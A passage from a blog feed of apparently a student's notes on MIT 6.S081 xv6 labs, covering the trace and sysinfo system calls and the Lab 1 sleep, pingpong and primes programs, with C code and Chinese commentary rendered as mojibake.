class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> num;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<span class="hljs-comment">//myproc()ï¼šå®ï¼Œå½“å‰çš„è¿›ç¨‹</span><br>  <span class="hljs-comment">// trap ä»£ç å°†ç”¨æˆ·å¯„å­˜å™¨ä¿å­˜åˆ°å½“å‰è¿›ç¨‹çš„ trapframe ä¸­</span><br>  num = p-&gt;trapframe-&gt;a7;<span class="hljs-comment">//numæ˜¯ç³»ç»Ÿè°ƒç”¨å·</span><br>  <span class="hljs-keyword">if</span>(num &gt; <span class="hljs-number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;<br>    p-&gt;trapframe-&gt;a0 = syscalls[num]();<span class="hljs-comment">//a0ä¿å­˜è¿”å›å€¼</span><br>    <span class="hljs-keyword">if</span>((p-&gt;mask&gt;&gt;num)&amp;<span class="hljs-number">1</span>)<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscall_name[num],p-&gt;trapframe-&gt;a0);<span class="hljs-comment">//è¿›ç¨‹idã€ç³»ç»Ÿè°ƒç”¨çš„åç§°ã€è¿”å›å€¼</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %s: unknown sys call %d\n&quot;</span>,<br>            p-&gt;pid, p-&gt;name, num);<br>    p-&gt;trapframe-&gt;a0 = <span class="hljs-number">-1</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">$ trace 32 grep hello README</span><br><span class="hljs-comment">3: syscall read -&gt; 1023</span><br><span class="hljs-comment">3: syscall read -&gt; 966</span><br><span class="hljs-comment">3: syscall read -&gt; 70</span><br><span class="hljs-comment">3: syscall read -&gt; 0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h1 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h1><p>In this assignment you will add a system call, <code>sysinfo</code>, that collects information about the running system. The system call takes one argument: a pointer to a <code>struct sysinfo</code> (see <code>kernel/sysinfo.h</code>). The kernel should fill out the fields of this struct: the <code>freemem</code> field should be set to the number of bytes of free memory, and the <code>nproc</code> field should be set to the number of processes whose <code>state</code> is not <code>UNUSED</code>. We provide a test program <code>sysinfotest</code>; you pass this assignment if it prints â€œsysinfotest: OKâ€.</p><p>ä»»åŠ¡ï¼šæ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ sysinfoï¼Œå®ƒæ”¶é›†å…³äºæ­£åœ¨è¿è¡Œçš„ç³»ç»Ÿçš„ä¿¡æ¯</p><ul><li>ç³»ç»Ÿè°ƒç”¨æœ‰ä¸€ä¸ªå‚æ•°: ä¸€ä¸ªæŒ‡å‘ struct sysinfo çš„æŒ‡é’ˆ(å‚è§ kernel/sysinfo.h)</li><li>å†…æ ¸åº”è¯¥å¡«å……è¿™ä¸ªç»“æ„çš„å­—æ®µ:<ul><li>freemem å­—æ®µåº”è¯¥è®¾ç½®ä¸ºå¯ç”¨å†…å­˜çš„å­—èŠ‚æ•°</li><li>nproc å­—æ®µåº”è¯¥è®¾ç½®ä¸ºçŠ¶æ€ä¸æ˜¯ UNUSED çš„è¿›ç¨‹æ•°</li></ul></li></ul><p>Sysinfo éœ€è¦å°†ä¸€ä¸ª struct sysinfo å¤åˆ¶å›ç”¨æˆ·ç©ºé—´; è¯·å‚é˜… sys_fstat ()(kernel/sysfile.c)å’Œ filestat()(kernel/file.c)ä»¥è·å¾—å¦‚ä½•ä½¿ç”¨ copy out ()å®ç°è¿™ä¸€ç‚¹çš„ç¤ºä¾‹ã€‚</p><ul><li>æ·»åŠ $U/_sysinfotest</li><li>ä¸ºäº†æ”¶é›†ç©ºé—²å†…å­˜é‡ï¼Œå‘ kernel/kalloc.c æ·»åŠ ä¸€ä¸ªå‡½æ•°getFreeByte()</li></ul><p>è¿™å—é‡ç‚¹æ˜¯ç†è§£runã€kmemç»“æ„ä½“çš„å®ç°ï¼Œå¹¶çŸ¥é“è®¿é—®èµ„æºçš„æ—¶å€™éœ€è¦åŠ é”ã€‚å¯ä»¥å‚è€ƒä¸€ä¸‹kalloc.cæ–‡ä»¶ä¸­åˆ«çš„å‡½æ•°çš„å®ç°ï¼Œå¾ˆå¤šåœ°æ–¹ç›´æ¥å¥—ç”¨å°±è¡Œ</p><ul><li>kmem.freelistæ˜¯ç©ºé—²é“¾è¡¨ï¼Œå½“é“¾è¡¨çš„nextæŒ‡é’ˆä¸ä¸ºç©ºæ—¶è¯´æ˜æœ‰ä¸€ä¸ªç©ºé—²èµ„æºå—ï¼Œéå†æ¬¡æ•°å°±æ˜¯é¡µçš„æ•°é‡</li><li>ç”±äºè¦æ±‚æ±‚å‡ºå­—èŠ‚ï¼Œå› æ­¤éœ€è¦<code>return PGSIZE*total;</code>ï¼ˆæ¯é¡µçš„å­—èŠ‚æ•°ä¹˜ä»¥totalï¼‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getFreeByte</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">p</span>;</span><br>  <span class="hljs-keyword">int</span> total=<span class="hljs-number">0</span>;<br><br>  acquire(&amp;kmem.lock);<span class="hljs-comment">//åŠ é”</span><br>  p=kmem.freelist;<br>  <span class="hljs-keyword">while</span>(p)<br>  &#123;<br>    total++;<br>    p=p-&gt;next;<br>  &#125;<br>  release(&amp;kmem.lock);<br>  <span class="hljs-keyword">return</span> PGSIZE*total;<span class="hljs-comment">//æ¯é¡µçš„å­—èŠ‚æ•°*total</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä¸ºäº†æ”¶é›†è¿›ç¨‹æ•°ï¼Œå‘ kernel/proc.c æ·»åŠ ä¸€ä¸ªå‡½æ•°getProcNum()</li></ul><p>proc.cä¸­æœ‰ä¸€ä¸ªå…¨å±€å˜é‡proc[NPROC]ï¼Œproc[0]æ˜¯ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œproc[NPROC-1]æ˜¯æœ€åä¸€ä¸ªè¿›ç¨‹ï¼Œç›´æ¥forå¾ªç¯éå†å³å¯å¾—åˆ°æ‰€æœ‰çš„è¿›ç¨‹ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œç„¶åå–å‡ºè¯¥æŒ‡é’ˆçš„stateå­—æ®µå’ŒUNUSEDæ¯”è¾ƒå³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> <span class="hljs-title">proc</span>[<span class="hljs-title">NPROC</span>];</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <span class="hljs-keyword">int</span> mask;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getProcNum</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> total=<span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br><br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) <br>  &#123;<br>    acquire(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">if</span>(p-&gt;state!=UNUSED)<br>      total++;<br>    release(&amp;p-&gt;lock);<br>  &#125;<br>  <span class="hljs-keyword">return</span> total;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>åœ¨sysproc.cä¸­æ·»åŠ å‡½æ•°sys_sysinfo(void)<ul><li>ä½¿ç”¨argaddrå‡½æ•° ä» trapframe ä¸­ä»¥æŒ‡é’ˆçš„å½¢å¼æ£€ç´¢ç¬¬ n ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå…³äºargaddrå‡½æ•°çš„ç”¨æ³•ï¼Œåœ¨æ–‡ä»¶çš„åˆ«çš„å‡½æ•°å¤„å¯ä»¥å‚è€ƒ</li><li>å£°æ˜ä¸€ä¸ªsysinfoç±»å‹çš„ç»“æ„ä½“å˜é‡ï¼Œç„¶åä½¿ç”¨ä¹‹å‰å†™å¥½çš„ä¸¤ä¸ªå‡½æ•°å¯¹å®ƒè¿›è¡Œèµ‹å€¼</li><li>ç”±äºéœ€è¦å°†ä¸€ä¸ªsysinfoç±»å‹çš„ç»“æ„ä½“å˜é‡èµ‹å€¼å›ç”¨æˆ·ç©ºé—´ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨copyoutå‡½æ•°ï¼Œæ³¨æ„è¿™ä¸ªå‡½æ•°çš„ç”¨æ³•ï¼Œæ¯”è¾ƒéš¾å†™å¯¹ã€‚ä¸€å®šè¦æœ‰<code>if(xxx) return -1 ;</code>çš„å½¢å¼ï¼Œä¸ç„¶çš„è¯ä¼šæŠ¥é”™ï¼ˆåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼‰</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sysinfo</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">/*int sysinfo(struct sysinfo *)</span><br><span class="hljs-comment">  struct sysinfo &#123;</span><br><span class="hljs-comment">  uint64 freemem;   // amount of free memory (bytes)</span><br><span class="hljs-comment">  uint64 nproc;     // number of process</span><br><span class="hljs-comment">  &#125;;</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>=</span>myproc();<br>  uint64 addr;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sysinfo</span> <span class="hljs-title">res</span>;</span><span class="hljs-comment">//æ³¨æ„è¿™é‡Œä¸å¯ä»¥æ˜¯æŒ‡é’ˆï¼Œéœ€è¦å£°æ˜ä¸€ä¸ªsysinfoç±»å‹çš„ç»“æ„ä½“å˜é‡</span><br><br>  <span class="hljs-keyword">if</span>(argaddr(<span class="hljs-number">0</span>, &amp;addr) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//addræ˜¯æŒ‡å‘sysinfoç»“æ„ä½“çš„æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <br>  res.freemem=getFreeByte();<br>  res.nproc=getProcNum();<br><br>  <span class="hljs-keyword">if</span>(copyout(p-&gt;pagetable, addr, (<span class="hljs-keyword">char</span>*)&amp;res, <span class="hljs-keyword">sizeof</span>(res))&lt;<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">/* å¦‚æœè¿™æ ·å†™ä¼šå¤±è´¥</span><br><span class="hljs-comment">  copyout(p-&gt;pagetable, addr, (char*)&amp;res, sizeof(res));</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰ä¸€äº›å¤´æ–‡ä»¶çš„æ·»åŠ ï¼Œå‡½æ•°æˆ–è€…ç»“æ„ä½“çš„å£°æ˜ã€å®šä¹‰çš„ç»†èŠ‚ï¼Œæš‚ä¸”ç•¥è¿‡</p><p><img src="/image/image-20230305004020691.png" alt="image-20230305004020691"></p>]]></content>
    
    
    <categories>
      
      <category>MIT6S081</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081ï¼šLab1 Xv6 and Unix utilities</title>
    <link href="/p/52c1e0f8/"/>
    <url>/p/52c1e0f8/</url>
    
    <content type="html"><![CDATA[<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://pdos.csail.mit.edu/6.828/2020/labs/util.html">https://pdos.csail.mit.edu/6.828/2020/labs/util.html</a></p><h1 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> git <span class="hljs-built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2020 <span class="hljs-comment"># æ‹‰å–ä»“åº“</span></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> xv6-labs-2020</span><br><span class="hljs-meta">$</span><span class="bash"> git checkout util <span class="hljs-comment"># åˆ‡æ¢åˆ†æ”¯</span></span><br><span class="hljs-meta">$</span><span class="bash"> make</span> <br><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br><span class="hljs-meta">$</span><span class="bash"> make grade <span class="hljs-comment"># è‡ªåŠ¨è¯„æµ‹æ‰€æœ‰çš„ç¨‹åº</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./grade-lab-util sleep <span class="hljs-comment"># è¯„æµ‹å•ä¸ªç¨‹åºsleep</span></span><br></code></pre></td></tr></table></figure><h1 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h1><p>Implement the UNIX program <code>sleep</code> for xv6; your <code>sleep</code> should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip. Your solution should be in the file <code>user/sleep.c</code>.</p><ul><li>åœ¨Makefileä¸­çš„UPROGä¸‹é¢åŠ å…¥sleep</li><li>åœ¨userç›®å½•åˆ›å»ºsleep.cæ–‡ä»¶</li><li>sleep.cåŠ å…¥çš„ä¸‰ä¸ªå¤´æ–‡ä»¶æ˜¯æ¨¡ä»¿äº†å…¶ä»–user/ç›®å½•çš„é£æ ¼</li><li>é¦–å…ˆè¿›è¡Œå‚æ•°çš„æ£€æŸ¥ï¼Œå¼‚å¸¸åˆ™é€€å‡º</li><li>ç›´æ¥è°ƒç”¨sleep()å‡½æ•°å³å¯ï¼Œå¯ä»¥åœ¨åˆ«çš„ç¨‹åºä¸­æ‰¾åˆ°è¿™ç§ç”¨æ³•</li><li>exit(0)é€€å‡ºç¨‹åº</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(argc != <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;Usage: sleep [times]\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    sleep(atoi(argv[<span class="hljs-number">1</span>]));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æŠ¥é”™ï¼šuser/sh.c:58:1: error: infinite recursion detected [-Werror=infinite-recursion]ï¼Œè§£å†³åŠæ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h1 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h1><p>Write a program that uses UNIX system calls to â€˜â€™ping-pongâ€™â€™ a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print â€œ<pid>: received pingâ€, where <pid> is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print â€œ<pid>: received pongâ€, and exit. Your solution should be in the file <code>user/pingpong.c</code>.</p><ul><li>int fd[2]åˆ›å»ºç®¡é“ï¼Œfd[0]è¯»ã€fd[1]å†™</li><li>ç®¡é“ç”¨æ³•ï¼šä¸€èˆ¬å…ˆåˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œç„¶åè¿›ç¨‹ä½¿ç”¨forkå‡½æ•°åˆ›å»ºå­è¿›ç¨‹ï¼Œä¹‹åçˆ¶è¿›ç¨‹å…³é—­ç®¡é“çš„è¯»ç«¯ï¼Œå­è¿›ç¨‹å…³é—­ç®¡é“çš„å†™ç«¯</li><li>è°ƒç”¨fork åï¼Œçˆ¶è¿›ç¨‹çš„ fork() ä¼šè¿”å›å­è¿›ç¨‹çš„ PIDï¼Œå­è¿›ç¨‹çš„forkè¿”å› 0</li><li>æ³¨æ„åˆ°writeç³»ç»Ÿè°ƒç”¨æ˜¯<code>ssize_t write(int fd, const void *buf, size_t count);</code>ï¼Œå› æ­¤å†™å…¥çš„å­—èŠ‚æ˜¯ä¸€ä¸ªåœ°å€ï¼Œç”±äºæˆ‘ä»¬å£°æ˜bufæ˜¯ä¸€ä¸ªcharç±»å‹ï¼Œå› æ­¤éœ€è¦å¡«å…¥&amp;buf</li><li>è¿™é‡Œè¸©äº†ä¸€ä¸ªå‘ï¼ŒæŠŠpingpongå†™æˆäº†pingpangå¯¼è‡´é”™è¯¯</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">char</span> * argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd1[<span class="hljs-number">2</span>],fd2[<span class="hljs-number">2</span>];<br>    pipe(fd1);<br>    pipe(fd2);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <br>    <span class="hljs-comment">// child</span><br>    <span class="hljs-comment">// print &quot;&lt;pid&gt;: received ping&quot;</span><br>    <span class="hljs-comment">// write back to parent a byte and exit </span><br>    <span class="hljs-comment">// close fd[1]</span><br>    <span class="hljs-comment">// zero for read and 1 for read </span><br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)  <br>    &#123;<br>        close(fd1[<span class="hljs-number">1</span>]);<span class="hljs-comment">//close write </span><br>        close(fd2[<span class="hljs-number">0</span>]);<span class="hljs-comment">//close read </span><br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">3</span>];<br>        read(fd1[<span class="hljs-number">0</span>],&amp;buf,<span class="hljs-number">1</span>);<span class="hljs-comment">//read a byte from parent</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received ping\n&quot;</span>,getpid()); <br>        write(fd2[<span class="hljs-number">1</span>],&amp;buf,<span class="hljs-number">1</span>);<span class="hljs-comment">//write back to parent </span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// parent</span><br>    <span class="hljs-comment">// send a byte to the child </span><br>    <span class="hljs-comment">// close fd[0]</span><br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        close(fd1[<span class="hljs-number">0</span>]);<span class="hljs-comment">//close read </span><br>        close(fd2[<span class="hljs-number">1</span>]);<span class="hljs-comment">//close write </span><br>        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">3</span>];<br>        write(fd1[<span class="hljs-number">1</span>],<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">// send a byte to the child</span><br>        read(fd2[<span class="hljs-number">0</span>],&amp;buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: received pong\n&quot;</span>,getpid()); <br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/20230208224322.png"></p><h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><p>Write a concurrent version of prime sieve using pipes. This idea is due to Doug McIlroy, inventor of Unix pipes. The picture halfway down <a href="http://swtch.com/~rsc/thread/">this page</a> and the surrounding text explain how to do it. Your solution should be in the file <code>user/primes.c</code>.</p><p>Your goal is to use <code>pipe</code> and <code>fork</code> to set up the pipeline. The first process feeds the numbers 2 through 35 into the pipeline. For each prime number, you will arrange to create one process that reads from its left neighbor over a pipe and writes to its right neighbor over another pipe. Since xv6 has limited number of file descriptors and processes, the first process can stop at 35.</p><ul><li>ä½¿ç”¨pipeå’Œforkæ¥è®¾ç½®ç®¡é“</li><li>ç”±äºxv6æ–‡ä»¶æè¿°ç¬¦å¾ˆå°‘ï¼Œæ‰€ä»¥éœ€è¦å…³é—­æ‰€æœ‰ä¸å¿…è¦çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¦åˆ™å°†ä¼šå¯¼è‡´æè¿°ç¬¦è€—å°½</li><li>ä¸»è¦çš„ç´ æ•°è¿›ç¨‹åº”è¯¥åªæœ‰åœ¨æ‰€æœ‰çš„è¾“å‡ºéƒ½æ‰“å°å‡ºæ¥ä¹‹åï¼Œå¹¶ä¸”åœ¨æ‰€æœ‰å…¶ä»–çš„ç´ æ•°è¿›ç¨‹éƒ½é€€å‡ºä¹‹åæ‰èƒ½é€€å‡º</li><li>å…³äºreadçš„ç”¨æ³•ï¼šå½“ç®¡é“çš„å†™ç«¯å…³é—­æ—¶ï¼Œread è¿”å›é›¶ï¼Œè¿™ä¸ªå¯ä»¥æ§åˆ¶whileçš„ç»ˆæ­¢æ¡ä»¶</li><li>ä¿®æ”¹Makefile çš„ UPROGS</li></ul><p>æ™®é€šçš„Cè¯­è¨€å†™æ³•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes2</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br><br>        <span 